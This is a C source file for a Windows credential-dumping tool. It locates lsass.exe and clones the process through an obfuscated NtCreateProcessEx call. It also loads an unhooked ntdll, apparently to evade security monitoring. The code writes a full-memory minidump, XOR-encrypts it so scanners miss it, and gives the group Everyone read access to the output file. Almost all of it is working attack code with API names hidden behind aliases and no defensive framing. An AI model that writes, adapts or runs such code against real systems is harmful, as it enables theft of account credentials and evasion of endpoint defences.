#include "defs.h"
#include "dump.h"
#include "logger.h"
#include "api.h"
#include "utils.h"

// ==================================
// Cloning LSASS
// ==================================

HANDLE CloneLsassProcess() {
    HANDLE hSnapshot = pCTH(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return NULL;

    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hLsass = NULL;
    if (pP32F(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                hLsass = pOP(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                break;
            }
        } while (pP32N(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    log_info("Found process: %ls (PID: %lu)", pe.szExeFile, pe.th32ProcessID);

    if (!hLsass) {
        log_error("Failed to open lsass.exe");
        return NULL;
    }

    HMODULE ntdll = LoadCleanDLL("ntdll.dll");
    if (!ntdll) return NULL;


    HANDLE hClone = NULL;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = pNTCPX(
        &hClone,
        PROCESS_ALL_ACCESS,
        &objAttr,
        hLsass,
        0,
        NULL,
        NULL,
        NULL,
        FALSE
    );

    CloseHandle(hLsass);

    if (status != 0) {
        log_error("pNTCPX failed : 0x % X", status);
        return NULL;
    }

    log_success("Successfully cloned process, handle: 0x%p", hClone);
    return hClone;
}

// Get PID
DWORD GetProcessIdFromHandle(HANDLE hProcess) {
    return pGPID(hProcess);
}

// ==================================
// Dumping LSASS
// ==================================

BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len) {
    HANDLE hClone = CloneLsassProcess();
    if (!hClone) {
        log_error("Failed to clone.");
        return FALSE;
    }

    DWORD clonedPID = GetProcessId(hClone);

    HANDLE hTempFile = pCFA(
        "C:\\Users\\Public\\__tmpdump.dmp",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    if (hTempFile == INVALID_HANDLE_VALUE) {
        log_error("Failed to create temp file. Error: %lu", GetLastError());
        return FALSE;
    }    

    BOOL dumped = pMDWD(
        hClone,
        clonedPID,
        hTempFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    if (!dumped) {
        log_error("Dump failed. Error: %lu", GetLastError());
        CloseHandle(hTempFile);
        return FALSE;
    }

    // Move file pointer to beginning
    SetFilePointer(hTempFile, 0, NULL, FILE_BEGIN);

    // Get file size
    DWORD fileSize = GetFileSize(hTempFile, NULL);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hTempFile, buffer, fileSize, &bytesRead, NULL);

    if (bytesRead != fileSize) {
        log_error("ReadFile read %lu bytes, expected %lu", bytesRead, fileSize);
        free(buffer);
        CloseHandle(hTempFile);
        return FALSE;
    }

    // XOR encrypt in memory
    char* encrypted = xor_encrypt_buffer(buffer, fileSize, key, key_len);
    free(buffer);
    CloseHandle(hTempFile);

    HANDLE dumpFile = pCFA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD bytesWritten;
    WriteFile(dumpFile, encrypted, fileSize, &bytesWritten, NULL);
    CloseHandle(dumpFile);
    free(encrypted);

    log_info("XOR'd dump written to %s", outPath);
    return TRUE;
}

// ==================================
// Set read access for everyone
// ==================================

BOOL SetFileGenericReadAccess(const char* filePath) {
    EXPLICIT_ACCESS ea = { 0 };
    PACL pNewDACL = NULL;

    ea.grfAccessPermissions = GENERIC_READ;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = L"Everyone";

    DWORD dwRes = SetEntriesInAcl(1, &ea, NULL, &pNewDACL);
    if (dwRes != ERROR_SUCCESS) return FALSE;

    dwRes = SetNamedSecurityInfoA(
        (LPSTR)filePath,
        SE_FILE_OBJECT,
        DACL_SECURITY_INFORMATION,
        NULL, NULL, pNewDACL, NULL
    );

    if (pNewDACL)
        LocalFree(pNewDACL);

    return dwRes == ERROR_SUCCESS;
}

